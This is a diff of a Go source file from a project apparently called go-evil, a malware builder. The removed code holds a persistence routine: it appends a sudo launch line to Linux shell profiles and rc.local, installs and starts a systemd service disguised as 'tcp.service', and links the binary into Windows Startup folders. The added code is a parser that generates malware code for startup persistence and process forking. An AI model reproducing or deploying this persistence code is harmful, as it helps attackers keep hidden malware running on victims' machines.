@@ -1,69 +1,51 @@
-package domains
+package system
 
 import (
-	"bufio"
-	"fmt"
-	"os"
-	"os/exec"
-	"runtime"
+	"regexp"
 
-	"github.com/s9rA16Bf4/go-evil/utility/converter"
-	user_var "github.com/s9rA16Bf4/go-evil/utility/variables/user"
+	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	"github.com/s9rA16Bf4/go-evil/utility/io"
+	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
-func System_exit(status_lvl string) {
-	status_lvl = user_var.Check_if_variable(status_lvl)
-	value := converter.String_to_int(status_lvl, "system.System_exit()")
-	os.Exit(value)
-}
+const (
+	EXTRACT_SUBDOMAIN = "[a-z]+\\.([a-z]+)\\.([a-z]+)\\(\"(.*)\"\\);"
+	EXTRACT_FUNCTION  = "system\\.([a-z]+)\\((\"(.+)\")?\\);"
+)
 
-func System_out(msg string) {
-	msg = user_var.Check_if_variable(msg)
-	fmt.Println(msg)
-}
-
-func AddToStartup() {
-	malware_name, _ := os.Executable() // Grabs also were we currently are
-	switch runtime.GOOS {
-	case "linux":
-		// Target bash & rc.local
-		target := []string{"/etc/profile", "~/.bash_profile", "~/.bash_login", "~/.profile", "/etc/rc.local"}
-		for _, line := range target {
-			in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)
-			if err == nil {
-				in.WriteString("sudo ." + malware_name + " &")
+func Parse(new_line string) {
+	regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
+	result := regex.FindAllStringSubmatch(new_line, -1)
+	if len(result) > 0 { // There is a subdomain to extract
+		switch result[0][1] {
+		default:
+			subdomain_error(result[0][1])
+		}
+	} else { // There might be a function which doesn't require a subdomain to work
+		regex := regexp.MustCompile(EXTRACT_FUNCTION)
+		result := regex.FindAllStringSubmatch(new_line, -1)
+		if len(result) > 0 {
+			switch result[0][1] {
+			case "exit":
+				mal.AddContent("sys.System_exit(\"" + result[0][3] + "\")")
+			case "out":
+				mal.AddContent("sys.System_out(\"" + result[0][3] + "\")")
+			case "add_to_startup":
+				mal.AddContent("sys.add_to_startup()")
+			case "spawn":
+				io.Append_domain("syscall") // Needed
+				mal.AddContent("syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)")
+			case "in":
+				mal.AddContent("sys.User_input()")
+			default:
+				function_error(result[0][1])
 			}
 		}
-		// Target systemd
-		in, err := os.Create("/lib/systemd/system/tcp.service")
-		if err == nil {
-			write := bufio.NewWriter(in)
-			what_to_write := []string{
-				"[Unit]",
-				"Description=My Sample Service",
-				"After=multi-user.target",
-
-				"[Service]",
-				"Type=idle",
-				"ExecStart=." + malware_name,
-
-				"[Install]",
-				"WantedBy=multi-user.target",
-			}
-			for _, line := range what_to_write {
-				write.WriteString(line + "\n")
-			}
-			exec.Command("sudo", "systemctl", "enable", "tcp.service").Run() // Enable it
-			exec.Command("sudo", "systemctl", "start", "tcp.service").Run()  // Run it
-		}
-	case "windows":
-		os.Link(malware_name, "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")     // Running user
-		os.Link(malware_name, "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") // All users
 	}
 }
-
-func User_input() {
-	var input string
-	fmt.Scanln(&input)           // This takes the user input and puts the result into input
-	user_var.Set_variable(input) // Save the input
+func subdomain_error(subdomain string) {
+	notify.Error("Unknown subdomain "+subdomain, "system.Parse()")
+}
+func function_error(function string) {
+	notify.Error("Unknown function "+function, "system.Parse()")
 }
